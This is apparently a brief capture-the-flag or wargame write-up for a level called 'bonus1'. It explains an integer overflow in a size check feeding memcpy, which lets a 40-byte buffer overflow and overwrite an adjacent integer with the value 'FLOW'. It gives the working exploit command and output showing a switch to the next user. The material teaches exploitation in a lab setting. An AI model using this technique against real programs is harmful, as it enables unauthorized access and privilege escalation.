value to target in nb : 1464814662 = 574f4c46 => \x46\x4c\x4f\x57

In order to pass the check we have to provide a negative value that check the if < 9 and then the memcpy (size_t) underflow  this value and the positive value should be 11 or more

because 11 * 4 = 44 and that's 40 bytes for the buffer and 4 bytes to fill the integer after the buffer in memory

this value is -1073741813 = 11 (overflow)

```bash
./bonus1 `(python -c 'print ("-1073741813")')` `(python -c 'print ("A" * 40 + "\x46\x4c\x4f\x57")')`
whoami
bonus2
```
